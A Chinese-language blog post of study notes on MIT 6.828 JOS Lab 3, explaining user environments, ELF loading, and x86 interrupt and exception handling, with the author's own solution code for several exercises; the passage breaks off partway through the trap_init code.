<p>当JOS成功运行之后，<code>envs</code>指针指向一个<code>struct Env</code>的数组，代表了系统中所有的环境。在设计上，JOS内核允许NNEV个同时激活的环境，NNEV在<code>inc/env.h</code>中定义。<br>JOS内核使用<code>env_free_list</code>维护所有未激活的<code>struct Env</code>，这样的设计简化的环境的分配和释放，它们仅仅需要从该链表上添加或移除。<br>JOS内核使用<code>curenv</code>去追踪在任意时刻当前正在执行的环境。在启动之后到第一个环境运行的时间段中，<code>curenv</code>被初始化为<code>NULL</code>。</p>
<h4 id="环境状态"><a href="#环境状态" class="headerlink" title="环境状态"></a>环境状态</h4><p><code>struct Env</code>在<code>inc/env.h</code>中被定义：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Trapframe</span> <span class="title">env_tf</span>;</span>	<span class="comment">// Saved registers</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">env_link</span>;</span>		<span class="comment">// Next free Env</span></span><br><span class="line">	<span class="keyword">envid_t</span> env_id;			<span class="comment">// Unique environment identifier</span></span><br><span class="line">	<span class="keyword">envid_t</span> env_parent_id;		<span class="comment">// env_id of this env's parent</span></span><br><span class="line">	<span class="keyword">enum</span> EnvType env_type;		<span class="comment">// Indicates special system environments</span></span><br><span class="line">	<span class="keyword">unsigned</span> env_status;		<span class="comment">// Status of the environment</span></span><br><span class="line">	<span class="keyword">uint32_t</span> env_runs;		<span class="comment">// Number of times environment has run</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Address space</span></span><br><span class="line">	<span class="keyword">pde_t</span> *env_pgdir;		<span class="comment">// Kernel virtual address of page dir</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>env_tf - <code>struct TrapFrame</code>在<code>inc/trap.h</code>中被定义，表示了当环境不运行时被保存的寄存器值，主要用于上下文切换</li>
<li>env_link - 指向了<code>env_free_list</code>上的下一个<code>struct Env</code>。<code>env_free_list</code>指向了链表中的第一个空闲环境</li>
<li>env_id - 唯一标识当前正在使用<code>struct Env</code>的环境。当环境终止后，<code>struct Env</code>可能被内核重新分配用于另一个不同的环境，但它们的env_id是不同的</li>
<li>env_parent_id - 存储了创建该环境的环境的<code>env_id</code>，通过该方式构建一个环境树，用于安全方面的决策</li>
<li>env_type - 用于区分特殊环境，对于大部分环境，该值为<code>ENV_TYPE_USER</code>，在后续Lab中会介绍其他的值</li>
<li>env_status - 状态<ul>
<li>ENV_FREE - 表明<code>struct Env</code>处于空闲状态，应当位于<code>env_free_list</code>上</li>
<li>ENV_RUNNABLE - 表明<code>struct Env</code>代表的环境正等待运行于处理器上</li>
<li>ENV_RUNNING - 表明<code>struct Env</code>代表的环境为正在运行的环境</li>
<li>ENV_NOT_RUNNABLE - 表明<code>struct Env</code>代表了一个正在运行的环境，但却没有准备好运行，如正在等待另一个环境的IPC（进程间通信）</li>
<li>ENV_DYING - 表明<code>struct Env</code>代表了一个僵死环境，僵死环境将在下一次陷入内核时被释放（直到Lab4才会使用该Flag）</li>
</ul>
</li>
<li>env_pgdir - 保存了环境的页目录的内核虚拟地址</li>
</ul>
<p>JOS中环境的概念综合了“线程”和“地址空间”，“线程”由<code>env_tf</code>域的被保存的寄存器值定义，“地址空间”由<code>env_pgdir</code>域指向的页目录和页表定义。为了运行一个环境，内核必须用保存的寄存器值和合适的地址空间设置CPU。</p>
<p>JOS的<code>struct Env</code>和xv6的<code>struct proc</code>很像，两种结构体都持有环境的用户模式寄存器状态（通过<code>struct TrapFrame</code>），然而，JOS中，独立的环境并不具有不同的内核栈，因为JOS内核中同时只能有一个运行的JOS环境，因此JOS只需要一个内核栈。</p>
<h4 id="分配环境数组"><a href="#分配环境数组" class="headerlink" title="分配环境数组"></a>分配环境数组</h4><p>练习1的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Make 'envs' point to an array of size 'NENV' of 'struct Env'.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="comment">// get size of envs</span></span><br><span class="line"><span class="keyword">uint32_t</span> envs_size = <span class="keyword">sizeof</span>(struct Env) * NENV;</span><br><span class="line"><span class="comment">// use boot_alloc to allocate memory</span></span><br><span class="line">envs = (struct Env *)boot_alloc(envs_size);</span><br><span class="line"><span class="comment">// initialization</span></span><br><span class="line"><span class="built_in">memset</span>(envs, <span class="number">0</span>, envs_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Map the 'envs' array read-only by the user at linear address UENVS</span></span><br><span class="line"><span class="comment">// (ie. perm = PTE_U | PTE_P).</span></span><br><span class="line"><span class="comment">// Permissions:</span></span><br><span class="line"><span class="comment">//    - the new image at UENVS  -- kernel R, user R</span></span><br><span class="line"><span class="comment">//    - envs itself -- kernel RW, user NONE</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">boot_map_region(kern_pgdir, UENVS, envs_size, PADDR(envs), PTE_U | PTE_P);</span><br></pre></td></tr></table></figure></p>
<h4 id="创建并运行环境"><a href="#创建并运行环境" class="headerlink" title="创建并运行环境"></a>创建并运行环境</h4><p>现在将在<code>kern/env.c</code>中编写必要的代码去运行用户环境。由于JOS内核还不支持文件系统，所以只能配置内核以加载一个嵌入内核中静态二进制镜像。JOS内核将这个二进制镜像以ELF可执行镜像格式嵌入。</p>
<p>Lab3的GNU<code>Makefile</code>在<code>obj/user/</code>目录下生成了一些二进制镜像。<code>kern/Makefrag</code>下可以看到，链接器的<code>-b binary</code>选项使得这些文件以原始的未被翻译二进制文件而非普通的被编译器生成的<code>.o</code>文件的方式链接， 通过<code>-b binary</code>方式链接的二进制文件就链接器而言可以为任意类型，甚至是文本文件或是图片。</p>
<p>如果在构建内核后观察<code>obj/kern/kernel.sym</code>，可以看到链接器生成了一些“奇怪”名字的符号如<code>_binary_obj_user_hello_start</code>， <code>_binary_obj_user_hello_end</code>或 <code>_binary_obj_user_hello_size</code>。链接器通过二进制文件的名字生成了这些符号的名字，这些符号使得内核代码可以以某种方式引用这些嵌入的二进制文件。</p>
<p>练习2中遇到的问题：</p>
<ul>
<li>除了<code>env-&gt;env_tf.tf_eip</code>以外不要修改其他的值，因为其已经在<code>env_alloc()</code>中被初始化</li>
<li><code>region_alloc()</code>中笔误导致只映射了一页</li>
<li><code>load_icode()</code>中需要切换页表，之后加载每段仅用一个<code>memcpy</code>即可实现</li>
</ul>
<p>练习2的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In env_init():</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">ssize_t</span> i;</span><br><span class="line"><span class="comment">// loop in reverse order to keep ascending order in env free list</span></span><br><span class="line"><span class="keyword">for</span> (i = NENV - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    <span class="comment">// set env_status, env_id</span></span><br><span class="line">    envs[i].env_status = ENV_FREE;</span><br><span class="line">    envs[i].env_id     = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// set env_link and insert into env_free_list</span></span><br><span class="line">    envs[i].env_link = env_free_list;</span><br><span class="line">    env_free_list    = &amp;envs[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In env_setup_vm():</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="comment">// set env_pgdir and generate page directory based on kern_pgdir</span></span><br><span class="line">e-&gt;env_pgdir = (<span class="keyword">pde_t</span> *)page2kva(p);</span><br><span class="line"><span class="built_in">memcpy</span>(e-&gt;env_pgdir, kern_pgdir, PGSIZE);</span><br><span class="line"><span class="comment">// increase pp_ref</span></span><br><span class="line">p-&gt;pp_ref++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In region_alloc():</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="comment">// (But only if you need it for load_icode.)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: It is easier to use region_alloc if the caller can pass</span></span><br><span class="line"><span class="comment">//   'va' and 'len' values that are not page-aligned.</span></span><br><span class="line"><span class="comment">//   You should round va down, and round (va + len) up.</span></span><br><span class="line"><span class="comment">//   (Watch out for corner-cases!)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// round va and va + len</span></span><br><span class="line"><span class="keyword">uintptr_t</span> start = (<span class="keyword">uintptr_t</span>)ROUNDDOWN(va, PGSIZE);</span><br><span class="line"><span class="keyword">uintptr_t</span> end   = (<span class="keyword">uintptr_t</span>)ROUNDUP(va + len, PGSIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (; start &lt; end; start += PGSIZE) &#123;</span><br><span class="line">    <span class="comment">// alloc page</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">p</span>;</span></span><br><span class="line">    p = page_alloc(ALLOC_ZERO);</span><br><span class="line">    <span class="keyword">if</span> (!p) &#123; panic(<span class="string">"out of memory when allocating region!"</span>); &#125;</span><br><span class="line">    <span class="comment">// insert page into environment's page directory</span></span><br><span class="line">    <span class="keyword">if</span> (page_insert(e-&gt;env_pgdir, p, (<span class="keyword">char</span> *)start, PTE_W | PTE_U | PTE_P) &lt;</span><br><span class="line">        <span class="number">0</span>) &#123;</span><br><span class="line">        panic(<span class="string">"out of memory when allocating region!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In load_icode():</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="comment">// switch address space for loading program segments</span></span><br><span class="line">lcr3(PADDR(e-&gt;env_pgdir));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Elf</span> *<span class="title">elf</span> = (<span class="title">struct</span> <span class="title">Elf</span> *)<span class="title">binary</span>;</span></span><br><span class="line"><span class="comment">// check elf magic</span></span><br><span class="line"><span class="keyword">if</span> (elf-&gt;e_magic != ELF_MAGIC) &#123; panic(<span class="string">"invalid elf format!"</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set the program entry for env</span></span><br><span class="line">e-&gt;env_tf.tf_eip = elf-&gt;e_entry;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Proghdr</span> *<span class="title">ph</span>, *<span class="title">eph</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// get the start and end of program header entry</span></span><br><span class="line">ph  = (struct Proghdr *)(binary + elf-&gt;e_phoff);</span><br><span class="line">eph = ph + elf-&gt;e_phnum;</span><br><span class="line"><span class="keyword">for</span> (; ph &lt; eph; ph++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ph-&gt;p_type == ELF_PROG_LOAD) &#123;    <span class="comment">// if the segment is to be loaded</span></span><br><span class="line">        <span class="comment">// alloc corresponding region(clear zero)</span></span><br><span class="line">        region_alloc(e, (<span class="keyword">char</span> *)ph-&gt;p_va, ph-&gt;p_memsz);</span><br><span class="line">        <span class="comment">// copy from ELF header to virtual addresses directly</span></span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)ph-&gt;p_va, (<span class="keyword">char</span> *)binary + ph-&gt;p_offset, ph-&gt;p_filesz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// switch back</span></span><br><span class="line">lcr3(PADDR(kern_pgdir));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now map one page for the program's initial stack</span></span><br><span class="line"><span class="comment">// at virtual address USTACKTOP - PGSIZE.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="comment">// allocate a page and insert it into env's page directory</span></span><br><span class="line"><span class="comment">// panic when page_alloc or page_insert failed</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">stack_page</span> = <span class="title">page_alloc</span>(<span class="title">ALLOC_ZERO</span>);</span></span><br><span class="line"><span class="keyword">if</span> (!stack_page) &#123; panic(<span class="string">"out of memory when alloc program's stack!"</span>); &#125;</span><br><span class="line"><span class="keyword">if</span> (page_insert(e-&gt;env_pgdir, stack_page, (<span class="keyword">char</span> *)(USTACKTOP - PGSIZE),</span><br><span class="line">                PTE_W | PTE_U | PTE_P) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    panic(<span class="string">"failed to set program's stack!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In env_create():</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">env</span>;</span></span><br><span class="line"><span class="comment">// allocate new env with parent ID 0</span></span><br><span class="line"><span class="keyword">if</span> (env_alloc(&amp;env, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123; panic(<span class="string">"failed to allocate env!"</span>); &#125;</span><br><span class="line"><span class="comment">// load elf binary and set env_type</span></span><br><span class="line">load_icode(env, binary);</span><br><span class="line">env-&gt;env_type = type;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In env_run():</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> (curenv != <span class="literal">NULL</span>) &#123;    <span class="comment">// context switch</span></span><br><span class="line">    <span class="keyword">if</span> (curenv-&gt;env_status == ENV_RUNNING) &#123;</span><br><span class="line">        <span class="comment">// change to runnable if current status is running</span></span><br><span class="line">        <span class="comment">// for not runnable, is not necessary to do this</span></span><br><span class="line">        curenv-&gt;env_status = ENV_RUNNABLE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set new curenv, update status and counter</span></span><br><span class="line">curenv        = e;</span><br><span class="line">e-&gt;env_status = ENV_RUNNING;</span><br><span class="line">e-&gt;env_runs++;</span><br><span class="line"><span class="comment">// address space switch</span></span><br><span class="line"><span class="comment">// reference from inc/x86.h</span></span><br><span class="line">lcr3(PADDR(e-&gt;env_pgdir));</span><br><span class="line"><span class="comment">// drop into user mode</span></span><br><span class="line">env_pop_tf(&amp;(e-&gt;env_tf));</span><br><span class="line"></span><br><span class="line"><span class="comment">// panic("env_run not yet implemented");</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>成功进入用户环境后，若用户环境尝试使用<code>int</code>指令进行系统调用时，将产生错误，因为JOS没有设置任何从用户空间进入内核的方式。<br>当CPU发现无法处理系统中断调用后，会产生一个通用保护错误，发现无法处理它，然后生成一个二重错误，最终因无法处理而生成一个三重错误并放弃，然后系统重启。但是为了便于调试，patch的<code>qemu</code>不会重启。<br>关于重启的理由可以参考<a href="https://blogs.msdn.microsoft.com/larryosterman/2005/02/08/faster-syscall-trap-redux/" target="_blank" rel="noopener">这里</a>。</p>
</blockquote>
<p>完成后经过测试，程序在<code>int $0x30</code>处Triple Fault，可知本部分代码基本正确。</p>
<h4 id="处理中断和异常"><a href="#处理中断和异常" class="headerlink" title="处理中断和异常"></a>处理中断和异常</h4><p>练习3要求阅读Intel 80386编程手册中的<a href="https://pdos.csail.mit.edu/6.828/2017/readings/i386/c09.htm" target="_blank" rel="noopener">第九章：异常和中断</a>。</p>
<p>本实验中将沿用Intel关于中断和异常的术语。中断是由处理器以外的异步事件引发的，而异常是由当前正在执行的指令同步引发的。</p>
<h4 id="保护控制转移基础"><a href="#保护控制转移基础" class="headerlink" title="保护控制转移基础"></a>保护控制转移基础</h4><p>异常和中断均为“保护控制转移”，会引发处理器从用户到内核模式（CPL=0），从而避免给用户模式的代码干扰内核或是其他环境的机会。这要求了引发中断或者是异常的代码不能选择进入内核的地点或方式。<br>在x86中，主要有两种机制一起保证了内核总是在受保护的情况下进入，这两种机制为中断描述符表（Interrupt Descriptor Table）和任务状态段（Task State Segment）。</p>
<p>中断描述符表中，处理器保证了异常和中断仅能导致内核在若干个具体的、由内核明确定义好的入口执行，而不是在中断和异常发生时运行的代码。<br>x86允许最多设立256个不同的中断或异常入口，每一个入口都具有一个中断向量。中断向量为0-255的数字，中断向量由中断来源决定：不同的设备，错误条件和应用程序对内核的请求会产生不同向量的中断。CPU使用中断向量作为处理器的中断描述符表的索引。中断描述符表在内核私有的内存中建立。<br>处理器从该表中加载送入EIP寄存器的值（处理程序的入口），以及送入CS段寄存器的值（包括了特权级，在JOS中，所有的异常均在内核模式执行，即特权级0）。</p>
<p>任务状态段。处理器需要在唤醒处理程序前将在中断或异常发生前的旧的处理器状态保存起来，如旧的EIP寄存器值和旧的CS段寄存器值，以便处理程序之后能恢复现场，从中断或异常发生的地方继续执行。然而，保存旧的处理器状态的区域必须对于非特权的用户模式代码处于被保护的状态。否则，错误的或是恶意的用户代码可能会破坏内核。<br>因此，当x86处理器从用户模式特权级切换到内核模式时，其也会切换到内核内存中的一个栈。任务状态段指定了相应的段寄存器以及相应栈的地址。处理器将<code>SS</code>, <code>EFLAGS</code>, <code>CS</code>, <code>EIP</code>以及一个可选的错误码压入这个新栈中。然后从中断描述符中读取相应的<code>CS</code>和<code>EIP</code>，并设置<code>ESP</code>和<code>SS</code>指向新的栈。<br>尽管<code>TSS</code>有着多种作用，JOS仅用它来定义从用户模式切换到内核模式时的内核栈。因为JOS中的内核模式为x86的特权级0，故处理器仅使用<code>TSS</code>的<code>ESP0</code>和<code>SS0</code>域。</p>
<h4 id="异常和中断的类型"><a href="#异常和中断的类型" class="headerlink" title="异常和中断的类型"></a>异常和中断的类型</h4><p>x86处理器能产生的所有同步异常均使用了0-31的中断向量，映射为<code>IDT</code>的0-31号入口。超过31的中断向量仅供由<code>int</code>指令或是由异步硬件中断产生的“软中断”使用。</p>
<h4 id="嵌套异常和中断"><a href="#嵌套异常和中断" class="headerlink" title="嵌套异常和中断"></a>嵌套异常和中断</h4><p>处理器能同时处理内核模式和用户模式的异常。在内核模式中的异常不需要切换栈，因此，不需要压入旧的<code>SS</code>和<code>ESP</code>值。通过这种方式，内核可以优雅地处理内核产生的嵌套异常和中断。该能力对于实现保护是非常重要的。</p>
<p>若处理器已经在内核模式中并且接受了一个异常并且无法将旧值压入内核栈中时（如内存不足），那么，处理器将无论如何也无法恢复，只能重启。内核必须设计良好以避免这种情况发生。</p>
<h4 id="建立IDT表"><a href="#建立IDT表" class="headerlink" title="建立IDT表"></a>建立IDT表</h4><p>由于JOS中使用的为IA_32的陷阱码，更推荐参考<a href="https://pdos.csail.mit.edu/6.828/2017/readings/ia32/IA32-3A.pdf" target="_blank" rel="noopener">IA_32的第五章</a>。</p>
<p>练习4中遇到的问题如下：</p>
<ul>
<li>设置陷阱门时段选择子应当为<code>GD_KT</code>而不是<code>GD_KD</code>，因为错误处理函数均被链接至了内核的<code>text</code>段。</li>
<li>已存在<code>page_fault_handler</code>的函数，命名时需避免重名。</li>
<li>不能直接用立即数设置段寄存器。</li>
</ul>
<p>练习4的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In trapentry.S:</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Lab 3: Your code here for generating entry points for the different traps.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">TRAPHANDLER_NOEC(divide_error_handler, T_DIVIDE)</span><br><span class="line">TRAPHANDLER_NOEC(debug_exception_handler, T_DEBUG)</span><br><span class="line">TRAPHANDLER_NOEC(non_maskable_interrupt_handler, T_NMI)</span><br><span class="line">TRAPHANDLER_NOEC(breakpoint_handler, T_BRKPT)</span><br><span class="line">TRAPHANDLER_NOEC(overflow_handler, T_OFLOW)</span><br><span class="line">TRAPHANDLER_NOEC(bounds_check_handler, T_BOUND)</span><br><span class="line">TRAPHANDLER_NOEC(invalid_opcode_handler, T_ILLOP)</span><br><span class="line">TRAPHANDLER_NOEC(device_not_available_handler, T_DEVICE)</span><br><span class="line">TRAPHANDLER(double_fault_handler, T_DBLFLT)</span><br><span class="line">TRAPHANDLER(invalid_tss_handler, T_TSS)</span><br><span class="line">TRAPHANDLER(segment_not_present_handler, T_SEGNP)</span><br><span class="line">TRAPHANDLER(stack_exception_handler, T_STACK)</span><br><span class="line">TRAPHANDLER(general_protection_fault_handler, T_GPFLT)</span><br><span class="line">TRAPHANDLER(pagefault_handler, T_PGFLT)</span><br><span class="line">TRAPHANDLER_NOEC(floating_point_error_handler, T_FPERR)</span><br><span class="line">TRAPHANDLER(alignment_check_handler, T_ALIGN)</span><br><span class="line">TRAPHANDLER_NOEC(machine_check_handler, T_MCHK)</span><br><span class="line">TRAPHANDLER_NOEC(simd_floating_point_error_handler, T_SIMDERR)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Lab 3: Your code here for _alltraps</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">_alltraps:</span><br><span class="line"><span class="comment">// push ds and es and general registers</span></span><br><span class="line">push %ds</span><br><span class="line">push %es</span><br><span class="line">pushal</span><br><span class="line"></span><br><span class="line"><span class="comment">// load ds and es with GD_KD, for kernel stack locates in data</span></span><br><span class="line">mov $GD_KD, %ax</span><br><span class="line">mov %ax, %ds</span><br><span class="line">mov %ax, %es</span><br><span class="line"></span><br><span class="line"><span class="comment">// pass tf as an argument</span></span><br><span class="line">pushl %esp</span><br><span class="line"></span><br><span class="line"><span class="comment">// call trap and no need to return</span></span><br><span class="line">call trap</span><br><span class="line"></span><br><span class="line"><span class="comment">// In trap.c, trap_init():</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="comment">// declare of exception handler</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">divide_error_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">debug_exception_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">non_maskable_interrupt_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">breakpoint_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">overflow_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bounds_check_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">invalid_opcode_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">device_not_available_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">double_fault_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">invalid_tss_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">segment_not_present_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stack_exception_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">general_protection_fault_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pagefault_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">floating_point_error_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">alignment_check_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">machine_check_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">simd_floating_point_error_handler</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set up trap gate descriptor</span></span><br><span class="line">SETGATE(idt[T_DIVIDE],	 <span class="number">1</span>, GD_KT, divide_error_handler,           	   <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_DEBUG],    <span class="number">1</span>, GD_KT, debug_exception_handler,            <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_NMI],      <span 